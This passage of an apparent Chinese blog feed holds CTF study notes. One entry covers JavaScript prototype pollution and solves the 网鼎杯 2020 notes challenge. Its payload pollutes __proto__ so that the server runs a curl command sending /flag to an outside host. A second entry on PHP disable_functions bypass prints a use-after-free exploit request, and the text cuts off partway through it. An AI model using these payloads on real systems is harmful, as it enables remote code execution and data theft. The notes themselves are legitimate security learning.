punctuation">)</span><span class="token comment">//null</span></code></pre><h2 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h2><pre class="language-js" data-language="js"><code class="language-js"><span class="token operator">></span> <span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token punctuation">&#123;</span>cc<span class="token operator">:</span><span class="token number">3</span><span class="token punctuation">&#125;</span><span class="token keyword">undefined</span><span class="token operator">></span> a<span class="token punctuation">.</span>__proto__<span class="token punctuation">[</span>Object<span class="token operator">:</span> <span class="token keyword">null</span> prototype<span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token comment">//a得原型是&#123;&#125;</span><span class="token operator">></span> a<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>cc <span class="token operator">=</span> <span class="token number">9</span><span class="token comment">//在a得原型上添加cc属性</span><span class="token number">9</span><span class="token operator">></span> a1 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token operator">></span> a1<span class="token punctuation">.</span>cc<span class="token comment">//新建得a1也会有cc属性</span><span class="token number">9</span><span class="token operator">></span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span>cc</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> cc<span class="token operator">:</span> <span class="token number">3</span> <span class="token punctuation">&#125;</span> <span class="token number">9</span><span class="token keyword">undefined</span><span class="token operator">></span></code></pre><blockquote><p>那么，在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是<code>原型链污染</code>。</p></blockquote><p>什么时候可以设置<code>__proto__</code>的值，找可控的数组或对象的键名</p><p><code>merge</code></p><p><code>clone</code></p><p><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html">https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html</a></p><h2 id="网鼎杯-2020-青龙组-notes"><a href="#网鼎杯-2020-青龙组-notes" class="headerlink" title="[网鼎杯 2020 青龙组]notes"></a>[网鼎杯 2020 青龙组]notes</h2><p>给了源码</p><p><code>app.js</code></p><pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'path'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> undefsafe <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'undefsafe'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token punctuation">&#123;</span> exec <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Notes</span> <span class="token punctuation">&#123;</span>    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>owner <span class="token operator">=</span> <span class="token string">"whoknows"</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>num <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>note_list <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">write_note</span><span class="token punctuation">(</span><span class="token parameter">author<span class="token punctuation">,</span> raw_note</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>note_list<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>num<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"author"</span><span class="token operator">:</span> author<span class="token punctuation">,</span><span class="token string">"raw_note"</span><span class="token operator">:</span>raw_note<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">get_note</span><span class="token punctuation">(</span><span class="token parameter">id</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> r <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>        <span class="token function">undefsafe</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span> id<span class="token punctuation">,</span> <span class="token function">undefsafe</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>note_list<span class="token punctuation">,</span> id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> r<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">edit_note</span><span class="token punctuation">(</span><span class="token parameter">id<span class="token punctuation">,</span> author<span class="token punctuation">,</span> raw</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">undefsafe</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>note_list<span class="token punctuation">,</span> id <span class="token operator">+</span> <span class="token string">'.author'</span><span class="token punctuation">,</span> author<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">undefsafe</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>note_list<span class="token punctuation">,</span> id <span class="token operator">+</span> <span class="token string">'.raw_note'</span><span class="token punctuation">,</span> raw<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">get_all_notes</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>note_list<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">remove_note</span><span class="token punctuation">(</span><span class="token parameter">id</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">delete</span> <span class="token keyword">this</span><span class="token punctuation">.</span>note_list<span class="token punctuation">[</span>id<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">var</span> notes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Notes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>notes<span class="token punctuation">.</span><span class="token function">write_note</span><span class="token punctuation">(</span><span class="token string">"nobody"</span><span class="token punctuation">,</span> <span class="token string">"this is nobody's first note"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'views'</span><span class="token punctuation">,</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'views'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'view engine'</span><span class="token punctuation">,</span> <span class="token string">'pug'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">urlencoded</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> extended<span class="token operator">:</span> <span class="token boolean">false</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">static</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'public'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> title<span class="token operator">:</span> <span class="token string">'Notebook'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">route</span><span class="token punctuation">(</span><span class="token string">'/add_note'</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'mess'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>message<span class="token operator">:</span> <span class="token string">'please use POST to add a note'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> author <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>author<span class="token punctuation">;</span>        <span class="token keyword">let</span> raw <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>raw<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>author <span class="token operator">&amp;&amp;</span> raw<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            notes<span class="token punctuation">.</span><span class="token function">write_note</span><span class="token punctuation">(</span>author<span class="token punctuation">,</span> raw<span class="token punctuation">)</span><span class="token punctuation">;</span>            res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'mess'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>message<span class="token operator">:</span> <span class="token string">"add note sucess"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'mess'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>message<span class="token operator">:</span> <span class="token string">"did not add note"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">route</span><span class="token punctuation">(</span><span class="token string">'/edit_note'</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'mess'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>message<span class="token operator">:</span> <span class="token string">"please use POST to edit a note"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> id <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>id<span class="token punctuation">;</span>        <span class="token keyword">let</span> author <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>author<span class="token punctuation">;</span>        <span class="token keyword">let</span> enote <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>raw<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>id <span class="token operator">&amp;&amp;</span> author <span class="token operator">&amp;&amp;</span> enote<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            notes<span class="token punctuation">.</span><span class="token function">edit_note</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span> author<span class="token punctuation">,</span> enote<span class="token punctuation">)</span><span class="token punctuation">;</span>            res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'mess'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>message<span class="token operator">:</span> <span class="token string">"edit note sucess"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'mess'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>message<span class="token operator">:</span> <span class="token string">"edit note failed"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">route</span><span class="token punctuation">(</span><span class="token string">'/delete_note'</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'mess'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>message<span class="token operator">:</span> <span class="token string">"please use POST to delete a note"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> id <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>id<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>id<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            notes<span class="token punctuation">.</span><span class="token function">remove_note</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>            res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'mess'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>message<span class="token operator">:</span> <span class="token string">"delete done"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'mess'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>message<span class="token operator">:</span> <span class="token string">"delete failed"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">route</span><span class="token punctuation">(</span><span class="token string">'/notes'</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> q <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>q<span class="token punctuation">;</span>        <span class="token keyword">let</span> a_note<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">"undefined"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            a_note <span class="token operator">=</span> notes<span class="token punctuation">.</span><span class="token function">get_all_notes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            a_note <span class="token operator">=</span> notes<span class="token punctuation">.</span><span class="token function">get_note</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'note'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>list<span class="token operator">:</span> a_note<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">route</span><span class="token punctuation">(</span><span class="token string">'/status'</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> commands <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"script-1"</span><span class="token operator">:</span> <span class="token string">"uptime"</span><span class="token punctuation">,</span>            <span class="token string">"script-2"</span><span class="token operator">:</span> <span class="token string">"free -m"</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> index <span class="token keyword">in</span> commands<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">exec</span><span class="token punctuation">(</span>commands<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>shell<span class="token operator">:</span><span class="token string">'/bin/bash'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> stdout<span class="token punctuation">,</span> stderr</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">return</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">stdout: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>stdout<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'OK'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Sorry cant find that!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>err<span class="token punctuation">.</span>stack<span class="token punctuation">)</span><span class="token punctuation">;</span>  res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Something broke!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> port <span class="token operator">=</span> <span class="token number">8080</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span>port<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Example app listening at http://localhost:</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>port<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>主要点在<code>/status</code>里得<code>exec</code></p><p><img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204161846953.png"></p><p>所以如果能够污染<code>commands</code>就能达到<code>RCE</code></p><p><code>for...in</code> 能够遍历到对象的可枚举的属性<code>包括对象自身的属性</code>，<code>原型链上的属性</code></p><p><a href="https://zhuanlan.zhihu.com/p/47291013">https://zhuanlan.zhihu.com/p/47291013</a></p><p><img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204161849744.png"></p><p>在<code>edit_note(id, author, raw)</code>函数中三个参数可控</p><p>undefsafe    <a href="https://github.com/remy/undefsafe">https://github.com/remy/undefsafe</a></p><p>undefsafe是Nodejs的一个第三方模块，其核心为一个简单的函数，用来处理访问对象属性不存在的报错</p><pre class="language-js" data-language="js"><code class="language-js">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token comment">// &#123; a: &#123; b: &#123; c: 1, d: [Array], e: 'skysec' &#125; &#125; &#125;</span><span class="token function">undefsafe</span><span class="token punctuation">(</span>object<span class="token punctuation">,</span><span class="token string">'a.b.e'</span><span class="token punctuation">,</span><span class="token string">'123'</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token comment">// &#123; a: &#123; b: &#123; c: 1, d: [Array], e: '123' &#125; &#125; &#125;</span></code></pre><p>payload:</p><p><code>/edit_note</code>路由下POST</p><pre class="language-txt" data-language="txt"><code class="language-txt">id&#x3D;__proto__&amp;raw&#x3D;a&amp;author&#x3D;curl xxx.xxx.xxx.xx:2233 -d &#96;cat &#x2F;flag&#96;</code></pre><p><code>this.note_list</code>得原型是<code>&#123;&#125;</code>，传入得</p><pre class="language-txt" data-language="txt"><code class="language-txt">undefsafe(&#123;&#125;,&quot;__proto__.author&quot;,&quot;curl vps:1234 -d &#96;cat &#x2F;flag&quot;);</code></pre><p>访问<code>/status</code>路由</p><p><img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204181716365.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;js前置知识&quot;&gt;&lt;a href=&quot;#js前置知识&quot; class=&quot;headerlink&quot; title=&quot;js前置知识&quot;&gt;&lt;/a&gt;js前置知识&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt; javascript是一个面向对象的语言到但是并没有class和对象的区分，cl</summary>
      
    
    
    
    <category term="笔记" scheme="http://lll-nnn.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="js原型链污染" scheme="http://lll-nnn.github.io/tags/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
    
  </entry>
  
  <entry>
    <title>Bypass_disable_function</title>
    <link href="http://lll-nnn.github.io/2022/04/15/bypass-disable-function/"/>
    <id>http://lll-nnn.github.io/2022/04/15/bypass-disable-function/</id>
    <published>2022-04-14T16:35:51.000Z</published>
    <updated>2022-04-17T15:33:43.318Z</updated>
    
    <content type="html"><![CDATA[<h2 id="phpinfo"><a href="#phpinfo" class="headerlink" title="phpinfo"></a>phpinfo</h2><p>拿到<code>phpinfo</code>后需要关注的对象</p><p><code>PHP Variables</code></p><blockquote><p>比如<code>$_SERVER[&#39;PATH&#39;]</code>获取系统环境变量</p><p><code>$_SERVER[&#39;DOCUMENT_ROOT&#39;]</code>获取网站路径</p></blockquote><p><code>open_basedir</code></p><p><code>PHP Version 7.2.9</code></p><p><code>disable_functions</code></p><p><code>allow_url_include</code></p><p><code>allow_url_fopen</code></p><p><code>auto_append_file</code></p><p><code>auto_prepend_file</code></p><p><code>short_open_tag</code></p><blockquote><p>决定是否允许使用 PHP 代码开始标志的缩写形式（<code>&lt;? ?&gt;</code>）。</p><p>本指令不会影响到缩写形式 <code>&lt;?=</code>，因为它总是可用的。</p></blockquote><h2 id="bypass1"><a href="#bypass1" class="headerlink" title="bypass1"></a>bypass1</h2><p><code>https://github.com/mm0r1/exploits/blob/master/php-filter-bypass/exploit.php</code></p><p>一句话改为<code>POST</code>传值<code>?exp=eval($_POST[1]);</code>，构造表单</p><pre><code>POST /?exp=eval($_POST[1]); HTTP/1.1Host: 7c04b880-d3fb-4428-b036-3b2c06f5ae68.node4.buuoj.cn:81Content-Length: 6915Content-Type:multipart/form-data;boundary=----WebKitFormBoundaryj28zfvoWVxnHdp29Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: close------WebKitFormBoundaryj28zfvoWVxnHdp29Content-Disposition: form-data; name=&quot;1&quot;pwn(&#39;whoami&#39;);function pwn($cmd) &#123;    define(&#39;LOGGING&#39;, false);    define(&#39;CHUNK_DATA_SIZE&#39;, 0x60);    define(&#39;CHUNK_SIZE&#39;, ZEND_DEBUG_BUILD ? CHUNK_DATA_SIZE + 0x20 : CHUNK_DATA_SIZE);    define(&#39;FILTER_SIZE&#39;, ZEND_DEBUG_BUILD ? 0x70 : 0x50);    define(&#39;STRING_SIZE&#39;, CHUNK_DATA_SIZE - 0x18 - 1);    define(&#39;CMD&#39;, $cmd);    for($i = 0; $i &lt; 10; $i++) &#123;        $groom[] = Pwn::alloc(STRING_SIZE);    &#125;    stream_filter_register(&#39;pwn_filter&#39;, &#39;Pwn&#39;);    $fd = fopen(&#39;php://memory&#39;, &#39;w&#39;);    stream_filter_append($fd,&#39;pwn_filter&#39;);    fputs($fd, &#39;x&#39;);&#125;class Helper &#123; public $a, $b, $c; &#125;class Pwn extends php_user_filter &#123;    private $abc, $abc_addr;    private $helper, $helper_addr, $helper_off;    private $uafp, $hfp;    public function filter($in, $out, &amp;$consumed, $closing) &#123;        if($closing) return;        stream_bucket_make_writeable($in);        $this-&gt;filtername = Pwn::alloc(STRING_SIZE);        fclose($this-&gt;stream);        $this-&gt;go();        return PSFS_PASS_ON;    &#125;    private function go() &#123;        $this-&gt;abc = &amp;$this-&gt;filtername;        $this-&gt;make_uaf_obj();        $this-&gt;helper = new Helper;        $this-&gt;helper-&gt;b = function($x) &#123;&#125;;        $this-&gt;helper_addr = $this-&gt;str2ptr(CHUNK_SIZE * 2 - 0x18) - CHUNK_SIZE * 2;        $this-&gt;log(&quot;helper @ 0x%x&quot;, $this-&gt;helper_addr);        $this-&gt;abc_addr = $this-&gt;helper_addr - CHUNK_SIZE;        $this-&gt;log(&quot;abc @ 0x%x&quot;, $this-&gt;abc_addr);        $this-&gt;helper_off = $this-&gt;helper_addr - $this-&gt;abc_addr - 0x18;        $helper_handlers = $this-&gt;str2ptr(CHUNK_SIZE);        $this-&gt;log(&quot;helper handlers @ 0x%x&quot;, $helper_handlers);        